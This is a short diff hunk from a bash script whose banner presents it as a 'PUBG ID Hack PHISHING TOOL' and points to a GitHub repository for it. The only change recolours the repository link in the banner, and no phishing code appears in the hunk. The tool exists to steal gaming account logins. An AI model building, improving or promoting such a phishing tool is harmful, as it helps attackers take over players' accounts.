@@ -235,7 +235,7 @@ echo -e "\e[95m
   echo""    
   echo -e $'\e[1;33m\e[0m\e[1;33m    ██████████\e[0m'"\e[96m██████████"'\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m PUBG ID Hack PHISHING TOOL \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.2] \e[0m'                                       
   echo ""
-   echo -e $'\e[1;33m\e[0m\e[1;33m  [ \e[0m\e[1;32m Follow on Github :- https://github.com/OnlineHacKing/PUBG-Phishing \e[0m \e[1;32m\e[0m\e[1;33m] \e[0m'
+   echo -e $'\e[1;33m\e[0m\e[1;33m  [ \e[0m\e[1;32m Follow on Github :- \e[33mhttps://github.com/OnlineHacKing/PUBG-Phishing \e[0m \e[1;32m\e[0m\e[1;33m] \e[0m'
    echo ""
       echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\e[0m'
       echo -e "\e[93m    |O|n|l|i|n|e| |H|a|c|k|i|n|g|"      
